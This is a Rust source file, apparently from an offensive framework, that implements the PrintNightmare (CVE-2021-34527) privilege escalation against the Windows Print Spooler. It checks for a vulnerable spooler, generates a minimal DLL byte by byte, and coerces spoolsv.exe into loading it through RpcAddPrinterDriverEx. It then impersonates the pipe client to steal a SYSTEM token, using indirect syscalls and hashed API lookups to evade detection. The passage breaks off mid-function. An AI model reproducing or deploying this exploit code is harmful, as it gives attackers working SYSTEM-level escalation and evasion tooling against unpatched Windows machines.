//! Print Spooler exploitation LPE technique.
//!
//! Abuses the Windows Print Spooler service to load an arbitrary DLL as SYSTEM.
//! The Print Spooler runs as SYSTEM and can be coerced into loading a driver
//! DLL via the `RpcAddPrinterDriver` RPC call.
//!
//! # Techniques
//!
//! - **PrintNightmare (CVE-2021-34527)**: Exploits the `RpcAddPrinterDriver`
//!   API to load a DLL from a remote path (SMB share or local temp directory)
//!   as SYSTEM.  The DLL is loaded into the spooler process with SYSTEM
//!   privileges, enabling arbitrary code execution.
//!
//! - **Driver path manipulation**: The `pConfigFile` field in the
//!   `DRIVER_CONTAINER` struct can point to an arbitrary path instead of a
//!   legitimate printer driver.  The spooler service copies this file and
//!   loads it.
//!
//! # Constraints
//!
//! - Does NOT require Administrator privileges on most Windows versions
//!   (the original PrintNightmare exploited a missing access check).
//! - Patched in most modern Windows versions, but useful for:
//!   - Unpatched systems
//!   - Systems with the "Point and Print" policy misconfigured
//!   - Legacy Windows Server installations
//!
//! All NT API calls use indirect syscalls — no IAT entries.

use crate::win_types::HANDLE;
use anyhow::{anyhow, Context, Result};

// ── NTSTATUS helpers ───────────────────────────────────────────────────────

fn nt_success(status: i32) -> bool {
    status >= 0
}

fn nt_error(status: i32) -> bool {
    status < 0
}

// ── Print Spooler RPC constants ────────────────────────────────────────────

/// Driver container structure for RpcAddPrinterDriver.
/// Matches the MS-RPRN IDL definition.
#[repr(C)]
#[allow(non_snake_case)]
struct DriverContainer {
    cb_size: u32,
    driver_version: u32,
    /// 0 = kernel-mode, 1 = user-mode, 2 or 3 = user-mode (insulated)
    c_version: u32,
    p_name: *mut u16,
    p_environment: *mut u16,
    p_driver_path: *mut u16,
    p_data_file: *mut u16,
    p_config_file: *mut u16,
    p_help_file: *mut u16,
    p_dependent_files: *mut u16,
    p_monitor_name: *mut u16,
    p_default_data_type: *mut u16,
    pszz_previous_names: *mut u16,
    ft_driver_date: u64, // FILETIME
    dw_driver_version: u64,
    p_mfg_name: *mut u16,
    p_oem_url: *mut u16,
    p_provider: *mut u16,
}

// ── Spooler service state ──────────────────────────────────────────────────

/// Check if the Print Spooler service is running.
///
/// Uses `NtQuerySystemInformation` to enumerate processes and checks
/// for `spoolsv.exe`.
fn is_spooler_running() -> bool {
    const SYSTEM_PROCESS_INFORMATION: u32 = 5;

    #[repr(C)]
    struct SystemProcessInformation {
        next_entry_offset: u32,
        number_of_threads: u32,
        working_set_private_size: i64,
        cycle_count: u64,
        create_time: i64,
        user_time: i64,
        kernel_time: i64,
        image_name_length: u16,
        image_name_maximum_length: u16,
        image_name_buffer: *mut u16,
        base_priority: i32,
        unique_process_id: usize,
        inherited_from_unique_process_id: usize,
    }

    let target = match crate::syscalls::get_syscall_id("NtQuerySystemInformation") {
        Ok(t) => t,
        Err(_) => return false,
    };

    let mut return_length: u32 = 0;
    let _status = unsafe {
        crate::syscalls::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                SYSTEM_PROCESS_INFORMATION as u64,
                std::ptr::null_mut::<u8>() as u64,
                0u64,
                &mut return_length as *mut _ as u64,
            ],
        )
    };

    let buf_size = if return_length > 0 {
        return_length as usize + 0x1_0000
    } else {
        0x4_0000
    };

    let mut buffer = vec![0u8; buf_size];

    let status = unsafe {
        crate::syscalls::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                SYSTEM_PROCESS_INFORMATION as u64,
                buffer.as_mut_ptr() as u64,
                buf_size as u64,
                &mut return_length as *mut _ as u64,
            ],
        )
    };

    if !nt_success(status) {
        return false;
    }

    let mut offset: usize = 0;
    loop {
        if offset + std::mem::size_of::<SystemProcessInformation>() > buffer.len() {
            break;
        }

        let entry = unsafe { &*(buffer.as_ptr().add(offset) as *const SystemProcessInformation) };
        let name_len = entry.image_name_length as usize;

        if name_len > 0 && !entry.image_name_buffer.is_null() {
            let name_start = offset + std::mem::size_of::<SystemProcessInformation>();
            let name_end = name_start + name_len;
            if name_end <= buffer.len() {
                let name_u16: Vec<u16> = (0..name_len / 2)
                    .map(|i| {
                        let off = name_start + i * 2;
                        u16::from_le_bytes([buffer[off], buffer[off + 1]])
                    })
                    .collect();
                let name = String::from_utf16_lossy(&name_u16).to_lowercase();
                if name == "spoolsv.exe" {
                    return true;
                }
            }
        }

        let next = entry.next_entry_offset as usize;
        if next == 0 {
            break;
        }
        offset += next;
    }

    false
}

/// Check the Print Spooler vulnerability state.
///
/// Performs several checks:
/// 1. Is the Print Spooler service running?
/// 2. Is the RpcAddPrinterDriver endpoint accessible?
/// 3. Is the system patched against CVE-2021-34527?
///
/// Returns `true` if the system appears vulnerable.
pub fn check_spooler_vulnerability() -> Result<bool> {
    tracing::info!("lpe/print_spooler: checking Print Spooler vulnerability state");

    // Check 1: Is the spooler process running?
    if !is_spooler_running() {
        tracing::info!("lpe/print_spooler: spoolsv.exe is not running");
        return Ok(false);
    }

    tracing::debug!("lpe/print_spooler: spoolsv.exe is running");

    // Check 2: Can we open the spooler named pipe?
    // The Print Spooler listens on \\.\pipe\spoolss.
    // If we can open it, the service is accepting connections.
    let pipe_path = std::ffi::CString::new(r"\\.\pipe\spoolss")
        .map_err(|e| anyhow!("failed to create pipe path C string: {e}"))?;

    type CreateFileAFn = unsafe extern "system" fn(
        *const i8,
        u32,                   // dwDesiredAccess
        u32,                   // dwShareMode
        *mut std::ffi::c_void, // lpSecurityAttributes
        u32,                   // dwCreationDisposition
        u32,                   // dwFlagsAndAttributes
        *mut std::ffi::c_void, // hTemplateFile
    ) -> HANDLE;

    let create_file_fn: Option<CreateFileAFn> = unsafe {
        let dll_hash = pe_resolve::hash_str(b"kernel32.dll\0");
        let dll_base = match pe_resolve::get_module_handle_by_hash(dll_hash) {
            Some(b) => b,
            None => return Ok(false),
        };
        let fn_hash = pe_resolve::hash_str(b"CreateFileA\0");
        let addr = match pe_resolve::get_proc_address_by_hash(dll_base, fn_hash) {
            Some(a) => a,
            None => return Ok(false),
        };
        let mut out = std::mem::MaybeUninit::<CreateFileAFn>::uninit();
        std::ptr::copy_nonoverlapping(
            (&addr as *const usize).cast::<u8>(),
            out.as_mut_ptr().cast::<u8>(),
            std::mem::size_of::<usize>(),
        );
        Some(out.assume_init())
    };

    let create_file = match create_file_fn {
        Some(f) => f,
        None => return Ok(false),
    };

    // OPEN_EXISTING = 3, GENERIC_READ = 0x80000000, FILE_SHARE_READ = 1
    let pipe_handle = unsafe {
        create_file(
            pipe_path.as_ptr(),
            0x8000_0000, // GENERIC_READ
            1,           // FILE_SHARE_READ
            std::ptr::null_mut(),
            3, // OPEN_EXISTING
            0, // FILE_ATTRIBUTE_NORMAL
            std::ptr::null_mut(),
        )
    };

    let pipe_accessible = if pipe_handle == (-1isize) as HANDLE || pipe_handle.is_null() {
        false
    } else {
        // Close the handle — we only needed to check accessibility.
        let _ = crate::syscall!("NtClose", pipe_handle as u64);
        true
    };

    if !pipe_accessible {
        tracing::info!("lpe/print_spooler: spoolss pipe not accessible");
        return Ok(false);
    }

    tracing::debug!("lpe/print_spooler: spoolss pipe is accessible");

    // Check 3: Check Windows build number to estimate patch level.
    // PrintNightmare was patched in:
    // - Windows 10 21H1: Build 19043.1110+
    // - Windows Server 2019: Build 17763.2114+
    //
    // We read the build number from KUSER_SHARED_DATA which is always mapped
    // at 0x7FFE0000.
    let build_number = unsafe {
        let kusd = 0x7FFE0000usize as *const u8;
        let build = std::ptr::read_volatile(kusd.add(0x0260) as *const u32);
        build
    };

    tracing::debug!("lpe/print_spooler: Windows build number {build_number}");

    // If build >= 19043, assume potentially patched (but may still be vulnerable
    // if the patch is not installed).  For builds < 19043, assume vulnerable.
    //
    // In practice, many "patched" systems can still be exploited via
    // Point and Print misconfigurations, so we return true if the spooler
    // is running and the pipe is accessible, with a warning about patch state.
    if build_number >= 19043 {
        tracing::warn!(
            "lpe/print_spooler: build {} >= 19043 — system may be patched against PrintNightmare \
             but spooler is accessible; exploitation may still succeed via Point and Print",
            build_number
        );
    }

    // Return true if the spooler is accessible — let the caller decide
    // whether to attempt exploitation.
    Ok(pipe_accessible)
}

/// Exploit PrintNightmare (CVE-2021-34527) to load a DLL as SYSTEM.
///
/// # How It Works
///
/// 1. Verifies the Print Spooler is running and accessible.
/// 2. Creates a named pipe that the injected DLL will connect to.
/// 3. Generates a minimal PE32+ DLL whose `DllMain` calls `CreateFileA`
///    on our pipe when loaded (DLL_PROCESS_ATTACH).
/// 4. Writes the DLL to `%TEMP%\msprint_{pid}.dll`.
/// 5. Uses MS-RPRN `RpcAddPrinterDriverEx` (opnum 0x3D) via the
///    `\\.\pipe\spoolss` ncacn_np endpoint to coerce spoolsv.exe (SYSTEM)
///    into loading the DLL.
/// 6. Impersonates the resulting SYSTEM connection on the named pipe and
///    duplicates the token.
/// 7. Cleans up the temp DLL.
///
/// # Arguments
///
/// * `_ca_cert` - Unused; reserved for future RPC-over-HTTPS paths.
///
/// # Returns
///
/// A duplicated SYSTEM impersonation token on success.
pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
    tracing::info!("lpe/print_spooler: starting PrintNightmare exploitation");

    let vulnerable =
        check_spooler_vulnerability().context("failed to check spooler vulnerability")?;
    if !vulnerable {
        return Err(anyhow!(
            "Print Spooler is not running or not accessible — \
             PrintNightmare exploitation is not possible"
        ));
    }

    // ── 1. Create our named pipe ─────────────────────────────────────────
    let pid = unsafe {
        type GetCurrentProcessIdFn = unsafe extern "system" fn() -> u32;
        let dll_hash = pe_resolve::hash_str(b"kernel32.dll\0");
        let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;
        let fn_hash = pe_resolve::hash_str(b"GetCurrentProcessId\0");
        let addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)
            .ok_or_else(|| anyhow!("GetCurrentProcessId not found"))?;
        let f: GetCurrentProcessIdFn = std::mem::transmute(addr);
        f()
    };

    let pipe_name = format!(r"\\.\pipe\orch_pn_{}", pid);
    tracing::debug!("lpe/print_spooler: creating pipe {}", pipe_name);
    let pipe_handle = create_permissive_pipe(&pipe_name)?;

    // ── 2. Generate pipe-connector DLL ───────────────────────────────────
    // Build the pipe path as null-terminated ASCII (CreateFileA)
    let pipe_path_bytes: Vec<u8> = pipe_name.bytes().chain(std::iter::once(0u8)).collect();

    let dll_bytes = generate_pipe_connector_dll(&pipe_path_bytes);

    // ── 3. Write DLL to temp ─────────────────────────────────────────────
    let dll_path_wide = match write_dll_to_temp(&dll_bytes, pid) {
        Ok(p) => p,
        Err(e) => {
            unsafe { crate::syscall!("NtClose", pipe_handle as u64).ok() };
            return Err(e);
        }
    };

    // ── 4. Set up pipe impersonation thread ──────────────────────────────
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let success_flag = Arc::new(AtomicBool::new(false));
    let success_clone = Arc::clone(&success_flag);

    struct ThreadCtx {
        pipe: HANDLE,
        done: Arc<AtomicBool>,
    }
    let ctx = Box::into_raw(Box::new(ThreadCtx {
        pipe: pipe_handle,
        done: success_clone,
    }));

    unsafe extern "system" fn impersonate_thread(param: *mut std::ffi::c_void) -> u32 {
        let ctx = &*(param as *const ThreadCtx);

        type ConnectNamedPipeFn = unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void) -> i32;
        type ImpersonateFn = unsafe extern "system" fn(HANDLE) -> i32;

        let dll_hash = pe_resolve::hash_str(b"kernel32.dll\0");
        let base = match pe_resolve::get_module_handle_by_hash(dll_hash) {
            Some(b) => b,
            None => return 1,
        };
        let connect_fn: Option<ConnectNamedPipeFn> =
            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"ConnectNamedPipe\0"))
                .map(|a| std::mem::transmute(a));

        if let Some(connect) = connect_fn {
            connect(ctx.pipe, std::ptr::null_mut());
        }

        let adv_hash = pe_resolve::hash_str(b"advapi32.dll\0");
        if let Some(adv) = pe_resolve::get_module_handle_by_hash(adv_hash) {
            let imp_fn: Option<ImpersonateFn> = pe_resolve::get_proc_address_by_hash(
                adv,
                pe_resolve::hash_str(b"ImpersonateNamedPipeClient\0"),
            )
            .map(|a| std::mem::transmute(a));
            if let Some(imp) = imp_fn {
                if imp(ctx.pipe) != 0 {
                    ctx.done.store(true, Ordering::Release);
                }
            }
        }
        0
    }

    let mut thread_handle: usize = 0;
    let thread_status = unsafe {
        let target = crate::syscalls::get_syscall_id("NtCreateThreadEx")
            .map_err(|e| anyhow!("NtCreateThreadEx: {e}"))?;
        crate::syscalls::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                &mut thread_handle as *mut _ as u64,
                0x1FFFFF_u64,
                0u64,
                (-1isize) as u64,
                impersonate_thread as *const () as u64,
                ctx as u64,
                0u64,
                0u64,
                0u64,
                0u64,
                0u64,
            ],
        )
    };
    if nt_error(thread_status) {
        unsafe {
            drop(Box::from_raw(ctx));
            crate::syscall!("NtClose", pipe_handle as u64).ok();
        }
        delete_temp_dll(&dll_path_wide);
        return Err(anyhow!(
            "NtCreateThreadEx failed: 0x{:08X}",
            thread_status as u32
        ));
    }

    // ── 5. Call RpcAddPrinterDriverEx via raw MS-RPRN over the spoolss pipe
    tracing::debug!("lpe/print_spooler: sending RpcAddPrinterDriverEx via MS-RPRN");
    let rpc_result = invoke_ms_rprn_add_driver(&dll_path_wide);
    if let Err(e) = rpc_result {
        tracing::warn!("lpe/print_spooler: RPC call failed ({e:#}), DLL may still be loaded");
    }

    // ── 6. Wait for impersonation (up to 30 seconds) ─────────────────────
    let wait_ms = 30_000u64;
    let interval_ms = 250u64;
    let mut waited = 0u64;
    let got_connection = loop {
        if success_flag.load(Ordering::Acquire) {
            break true;
        }
        if waited >= wait_ms {
            break false;
        }
        // NtDelayExecution: LARGE_INTEGER in 100ns units, negative = relative
        let delay_100ns: i64 = -((interval_ms * 10_000) as i64);
        let _ =
            unsafe { crate::syscall!("NtDelayExecution", 0u64, &delay_100ns as *const i64 as u64) };
        waited += interval_ms;
    };

    // ── 7. Extract token ─────────────────────────────────────────────────
    let token_result = if got_connection {
        use windows_sys::Win32::Security::TokenImpersonation;
        use windows_sys::Win32::Security::{
            TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
        };
        let token = unsafe {
            // NtOpenThreadToken on the impersonation thread
            let mut tok: HANDLE = std::ptr::null_mut();
            let target = crate::syscalls::get_syscall_id("NtOpenThreadToken")
                .map_err(|e| anyhow!("NtOpenThreadToken: {e}"))?;
            let st = crate::syscalls::do_syscall(
                target.ssn,
                target.gadget_addr,
                &[
                    thread_handle as u64,
                    (TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY) as u64,
                    1u64, // OpenAsSelf
                    &mut tok as *mut _ as u64,
                ],
            );
            if nt_error(st) {
                return Err(anyhow!("NtOpenThreadToken failed: 0x{:08X}", st as u32));
            }
            tok
        };

        let dup_result = unsafe {
            use windows_sys::Win32::Security::SECURITY_QUALITY_OF_SERVICE;
            let mut new_token: HANDLE = std::ptr::null_mut();
            let mut sqos: SECURITY_QUALITY_OF_SERVICE = std::mem::zeroed();
            sqos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;
            sqos.ImpersonationLevel = windows_sys::Win32::Security::SecurityImpersonation as u32;
            let target = crate::syscalls::get_syscall_id("NtDuplicateToken")
                .map_err(|e| anyhow!("NtDuplicateToken: {e}"))?;
            let st = crate::syscalls::do_syscall(
                target.ssn,
                target.gadget_addr,
                &[
                    token as u64,
                    TOKEN_ALL_ACCESS as u64,
                    &mut sqos as *mut _ as u64,
                    0u64,
                    TokenImpersonation as u64,
                    &mut new_token as *mut _ as u64,
                ],
            );
            let _ = crate::syscall!("NtClose", token as u64);
            if nt_error(st) {
                Err(anyhow!("NtDuplicateToken failed: 0x{:08X}", st as u32))
            } else {
                Ok(new_token)
            }
        };
        dup_result
    } else {
        Err(anyhow!(
            "PrintNightmare: pipe connection timed out — spooler did not load DLL"
        ))
    };

    // ── 8. Cleanup ───────────────────────────────────────────────────────
    let _ = unsafe {
        let _ = crate::syscall!("NtClose", thread_handle as u64);
        let _ = crate::syscall!("NtClose", pipe_handle as u64);
        drop(Box::from_raw(ctx));
    };
    delete_temp_dll(&dll_path_wide);

    match token_result {
        Ok(tok) => {
            tracing::info!("lpe/print_spooler: PrintNightmare succeeded — SYSTEM token obtained");
            Ok(tok)
        }
        Err(e) => {
            tracing::warn!("lpe/print_spooler: PrintNightmare failed: {e:#}");
            Err(e)
        }
    }
}

// ── Named pipe creation helper (replicates named_pipe_impersonate logic) ──

fn create_permissive_pipe(pipe_path: &str) -> Result<HANDLE> {
    let path_c =
        std::ffi::CString::new(pipe_path).map_err(|e| anyhow!("invalid pipe path: {e}"))?;

    type CreateNamedPipeFn = unsafe extern "system" fn(
        *const i8,
        u32,
        u32,
        u32,
        u32,
        u32,
        u32,
        *mut std::ffi::c_void,
    ) -> HANDLE;

    let f: CreateNamedPipeFn = unsafe {
        let dll_hash = pe_resolve::hash_str(b"kernel32.dll\0");
        let base = pe_resolve::get_module_handle_by_hash(dll_hash)
            .ok_or_else(|| anyhow!("kernel32.dll not found"))?;
        let addr =
            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"CreateNamedPipeA\0"))
                .ok_or_else(|| anyhow!("CreateNamedPipeA not found"))?;
        std::mem::transmute(addr)
    };

    let h = unsafe {
        f(
            path_c.as_ptr() as *const i8,
            0x0000_0003, // PIPE_ACCESS_DUPLEX
            0x0000_0000, // PIPE_TYPE_BYTE
            1,           // max instances
            1024,
            1024,
            30_000,
            std::ptr::null_mut(),
        )
    };
    if h == (-1isize) as HANDLE || h.is_null() {
        Err(anyhow!("CreateNamedPipeA failed for '{pipe_path}'"))
    } else {
        Ok(h)
    }
}

// ── Minimal PE32+ DLL generator ───────────────────────────────────────────
//
// Generates a valid PE32+ DLL whose DllMain:
//   1. Checks fdwReason == DLL_PROCESS_ATTACH.
//   2. Calls CreateFileA(pipe_path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL).
//   3. Writes one byte via WriteFile.
//   4. Closes the handle.
//   5. Returns TRUE.
//
// Section layout (file-aligned to 0x200, section-aligned to 0x1000):
//   .text  at RVA 0x1000, file offset 0x200  — DllMain x86-64 code
//   .idata at RVA 0x2000, file offset 0x400  — import table (kernel32.dll)
//   .rdata at RVA 0x3000, file offset 0x600  — pipe path + byte_to_write
//
// IMAGE_BASE = 0x10000000.

fn generate_pipe_connector_dll(pipe_path_ascii_nul: &[u8]) -> Vec<u8> {
    // ── .idata layout ────────────────────────────────────────────────────
    // All offsets relative to start of .idata section (RVA 0x2000).
    //
    // +0x00  IMAGE_IMPORT_DESCRIPTOR for kernel32.dll  (20 bytes)
    // +0x14  Terminating IMAGE_IMPORT_DESCRIPTOR       (20 bytes, all zero)
    // +0x28  Padding                                    (8 bytes)
    // +0x30  IAT  = FirstThunk    — 4×8 bytes          (32 bytes)
    // +0x50  INT  = OrigFirstThk  — 4×8 bytes          (32 bytes)
    // +0x70  Hint/Name "CreateFileA\0"    hint(2)+name = 14 bytes
    // +0x7E  Hint/Name "WriteFile\0"       2+10 = 12 bytes
    // +0x8A  Hint/Name "CloseHandle\0"     2+12 = 14 bytes
    // +0x98  "kernel32.dll\0"              13 bytes

    const IAT_RVA: u32 = 0x2030;
    const INT_RVA: u32 = 0x2050;
    const CREATE_FILE_A_HN: u32 = 0x2070;
    const WRITE_FILE_HN: u32 = 0x207E;
    const CLOSE_HANDLE_HN: u32 = 0x208A;
    const DLL_NAME_RVA: u32 = 0x2098;

    let mut idata = vec![0u8; 0x200];

    // IMAGE_IMPORT_DESCRIPTOR
    idata[0x00..0x04].copy_from_slice(&INT_RVA.to_le_bytes()); // OriginalFirstThunk
    idata[0x08..0x0C].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes()); // ForwarderChain
    idata[0x0C..0x10].copy_from_slice(&DLL_NAME_RVA.to_le_bytes());
    idata[0x10..0x14].copy_from_slice(&IAT_RVA.to_le_bytes()); // FirstThunk

    // IAT (will be patched by loader)
    idata[0x30..0x38].copy_from_slice(&(CREATE_FILE_A_HN as u64).to_le_bytes());
    idata[0x38..0x40].copy_from_slice(&(WRITE_FILE_HN as u64).to_le_bytes());
    idata[0x40..0x48].copy_from_slice(&(CLOSE_HANDLE_HN as u64).to_le_bytes());
    // INT (same initial values)
    idata[0x50..0x58].copy_from_slice(&(CREATE_FILE_A_HN as u64).to_le_bytes());
    idata[0x58..0x60].copy_from_slice(&(WRITE_FILE_HN as u64).to_le_bytes());
    idata[0x60..0x68].copy_from_slice(&(CLOSE_HANDLE_HN as u64).to_le_bytes());
    // Hint/Name entries (hint=0 for all)
    idata[0x72..0x7E].copy_from_slice(b"CreateFileA\0");
    idata[0x80..0x8A].copy_from_slice(b"WriteFile\0");
    idata[0x8C..0x98].copy_from_slice(b"CloseHandle\0");
    // DLL name
    idata[0x98..0xA5].copy_from_slice(b"kernel32.dll\0");

    // ── .rdata layout ────────────────────────────────────────────────────
    // +0x00  pipe path (ASCII, null-terminated)
    // +pipe_len  byte_to_write (0x41)
    let pipe_len = pipe_path_ascii_nul.len(); // includes the NUL
    let mut rdata = vec![0u8; 0x200];
    let copy_len = pipe_len.min(rdata.len() - 2);
    rdata[..copy_len].copy_from_slice(&pipe_path_ascii_nul[..copy_len]);
    if pipe_len < rdata.len() {
        rdata[pipe_len] = 0x41; // byte_to_write = 'A'
    }

    // ── .text DllMain code ───────────────────────────────────────────────
    //
    // Known fixed displacements (from RVA layout above):
    //   lea rcx, [rip+X1]:  RIP = 0x1015, target = 0x3000
    //     X1 = 0x3000 - 0x1015 = 0x1FEB  →  LE [0xEB, 0x1F, 0x00, 0x00]
    //   call [rip+Z0] CreateFileA IAT = 0x2030:
    //     RIP = 0x103E, disp = 0x2030 - 0x103E = 0x0FF2  →  LE [0xF2, 0x0F, 0x00, 0x00]
    //   call [rip+Z1] WriteFile IAT = 0x2038:
    //     RIP = 0x1065, disp = 0x2038 - 0x1065 = 0x0FD3  →  LE [0xD3, 0x0F, 0x00, 0x00]
    //   call [rip+Z2] CloseHandle IAT = 0x2040:
    //     RIP = 0x106E, disp = 0x2040 - 0x106E = 0x0FD2  →  LE [0xD2, 0x0F, 0x00, 0x00]
    //   lea rdx, [rip+X2] byte_to_write:
    //     RIP = 0x104E, target = 0x3000 + pipe_len
    //     X2 = (0x3000 + pipe_len) - 0x104E = 0x1FB2 + pipe_len

    let x2: u32 = 0x1FB2 + pipe_len as u32;

    #[rustfmt::skip]
    let mut code: Vec<u8> = vec![
        // off  0: push rbp
        0x55,
        // off  1: mov rbp, rsp
        0x48, 0x89, 0xE5,
        // off  4: push rbx
        0x53,
        // off  5: sub rsp, 0x48
        0x48, 0x83, 0xEC, 0x48,
        // off  9: cmp edx, 1  (DLL_PROCESS_ATTACH)
        0x83, 0xFA, 0x01,
        // off 12: jnz .done  (offset = 110 - 14 = 96 = 0x60)
        0x75, 0x60,
        // off 14: lea rcx, [rip+0x1FEB]  — pipe path
        0x48, 0x8D, 0x0D, 0xEB, 0x1F, 0x00, 0x00,
        // off 21: mov edx, GENERIC_WRITE (0x40000000)
        0xBA, 0x00, 0x00, 0x00, 0x40,
        // off 26: xor r8d, r8d  (dwShareMode=0)
        0x45, 0x31, 0xC0,
        // off 29: xor r9d, r9d  (lpSecurityAttributes=NULL)
        0x45, 0x31, 0xC9,
        // off 32: mov dword ptr [rsp+0x20], 3  (OPEN_EXISTING)
        0xC7, 0x44, 0x24, 0x20, 0x03, 0x00, 0x00, 0x00,
        // off 40: mov dword ptr [rsp+0x28], 0  (FILE_ATTRIBUTE_NORMAL)
        0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
        // off 48: mov dword ptr [rsp+0x30], 0  (hTemplateFile=NULL)
        0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,
        // off 56: call [rip+0x0FF2]  — CreateFileA via IAT
        0xFF, 0x15, 0xF2, 0x0F, 0x00, 0x00,
        // off 62: cmp rax, -1  (INVALID_HANDLE_VALUE)
        0x48, 0x83, 0xF8, 0xFF,
        // off 66: je .done  (offset = 110 - 68 = 42 = 0x2A)
        0x74, 0x2A,
        // off 68: mov rbx, rax  (save handle)
        0x48, 0x89, 0xC3,
        // off 71: lea rdx, [rip+X2]  — &byte_to_write (displacement patched below)
        0x48, 0x8D, 0x15,
            (x2 & 0xFF) as u8,
            ((x2 >> 8) & 0xFF) as u8,
            ((x2 >> 16) & 0xFF) as u8,
            ((x2 >> 24) & 0xFF) as u8,
        // off 78: mov r8d, 1  (nBytesToWrite=1)
        0x41, 0xB8, 0x01, 0x00, 0x00, 0x00,
        // off 84: xor r9d, r9d  (lpNumberOfBytesWritten=NULL)
        0x45, 0x31, 0xC9,
        // off 87: mov dword ptr [rsp+0x20], 0  (lpOverlapped=NULL)
        0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
        // off 95: call [rip+0x0FD3]  — WriteFile via IAT
        0xFF, 0x15, 0xD3, 0x0F, 0x00, 0x00,
        // off 101: mov rcx, rbx
        0x48, 0x89, 0xD9,
        // off 104: call [rip+0x0FD2]  — CloseHandle via IAT
        0xFF, 0x15, 0xD2, 0x0F, 0x00, 0x00,
        // .done (off 110):
        // mov eax, 1  (return TRUE)
        0xB8, 0x01, 0x00, 0x00, 0x00,
        // off 115: add rsp, 0x48
        0x48, 0x83, 0xC4, 0x48,
        // off 119: pop rbx
        0x5B,
        // off 120: pop rbp
        0x5D,
        // off 121: ret
        0xC3,
    ];

    // Pad .text to file alignment
    code.resize(0x200, 0x90);

    // ── DOS header ───────────────────────────────────────────────────────
    let mut pe = vec![0u8; 0x200]; // headers
                                   // MZ
    pe[0x00] = b'M';
    pe[0x01] = b'Z';
    // e_lfanew = 0x40 (PE signature immediately after DOS header)
    pe[0x3C] = 0x40;
    // PE signature
    pe[0x40..0x44].copy_from_slice(b"PE\0\0");

    // ── COFF header (at 0x44) ────────────────────────────────────────────
    // Machine: AMD64
    pe[0x44..0x46].copy_from_slice(&0x8664u16.to_le_bytes());
    // NumberOfSections: 3
    pe[0x46..0x48].copy_from_slice(&3u16.to_le_bytes());
    // TimeDateStamp: 0
    // PointerToSymbolTable: 0, NumberOfSymbols: 0 (all zero)
    // SizeOfOptionalHeader: 240
    pe[0x54..0x56].copy_from_slice(&240u16.to_le_bytes());
    // Characteristics: IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_DLL | IMAGE_FILE_LARGE_ADDRESS_AWARE
    pe[0x56..0x58].copy_from_slice(&0x2022u16.to_le_bytes());

    // ── PE32+ Optional header (at 0x58) ─────────────────────────────────
    // Magic: PE32+
    pe[0x58..0x5A].copy_from_slice(&0x020Bu16.to_le_bytes());
    // SizeOfCode
    pe[0x5C..0x60].copy_from_slice(&0x200u32.to_le_bytes());
    // SizeOfInitializedData
    pe[0x60..0x64].copy_from_slice(&0x400u32.to_le_bytes());
    // AddressOfEntryPoint = 0x1000
    pe[0x68..0x6C].copy_from_slice(&0x1000u32.to_le_bytes());
    // BaseOfCode = 0x1000
    pe[0x6C..0x70].copy_from_slice(&0x1000u32.to_le_bytes());
    // ImageBase = 0x10000000
    pe[0x70..0x78].copy_from_slice(&0x1000_0000u64.to_le_bytes());
    // SectionAlignment = 0x1000
    pe[0x78..0x7C].copy_from_slice(&0x1000u32.to_le_bytes());
    // FileAlignment = 0x200
    pe[0x7C..0x80].copy_from_slice(&0x200u32.to_le_bytes());
    // MajorOSVersion = 6, MinorOSVersion = 0
    pe[0x80..0x82].copy_from_slice(&6u16.to_le_bytes());
    // MajorSubsystemVersion = 6, MinorSubsystemVersion = 0
    pe[0x88..0x8A].copy_from_slice(&6u16.to_le_bytes());
    // SizeOfImage = 0x4000
    pe[0x90..0x94].copy_from_slice(&0x4000u32.to_le_bytes());
    // SizeOfHeaders = 0x200
    pe[0x94..0x98].copy_from_slice(&0x200u32.to_le_bytes());
    // Subsystem: Windows GUI = 2
    pe[0x9C..0x9E].copy_from_slice(&2u16.to_le_bytes());
    // DllCharacteristics: NX_COMPAT only (no DYNAMIC_BASE — no .reloc section)
    pe[0x9E..0xA0].copy_from_slice(&0x0100u16.to_le_bytes());
    // SizeOfStackReserve
    pe[0xA0..0xA8].copy_from_slice(&0x10_0000u64.to_le_bytes());
    // SizeOfStackCommit
    pe[0xA8..0xB0].copy_from_slice(&0x1000u64.to_le_bytes());
    // SizeOfHeapReserve
    pe[0xB0..0xB8].copy_from_slice(&0x10_0000u64.to_le_bytes());
    // SizeOfHeapCommit
    pe[0xB8..0xC0].copy_from_slice(&0x1000u64.to_le_bytes());
    // NumberOfRvaAndSizes = 16
    pe[0xC4..0xC8].copy_from_slice(&16u32.to_le_bytes());
    // DataDirectory[1] = import table: RVA=0x2000, Size=0xA8 (covers descriptor + names)
    pe[0xD0..0xD4].copy_from_slice(&0x2000u32.to_le_bytes());
    pe[0xD4..0xD8].copy_from_slice(&0xA8u32.to_le_bytes());

    // ── Section headers ─────────────────────────────────────────────────
    // .text at header offset 0x148 (= 0x58 + 240 + 0x40[space after COFF] = no,
    //  actual: COFF is at 0x44, size 20 = 0x58; OptHdr at 0x58, size 240 = 0x148;
    //  section headers start at 0x148)
    fn write_section_header(
        buf: &mut [u8],
        offset: usize,
        name: &[u8; 8],
        vsize: u32,
        rva: u32,
        raw_size: u32,
        raw_off: u32,
        chars: u32,
    ) {
        buf[offset..offset + 8].copy_from_slice(name);
        buf[offset + 8..offset + 12].copy_from_slice(&vsize.to_le_bytes());
        buf[offset + 12..offset + 16].copy_from_slice(&rva.to_le_bytes());
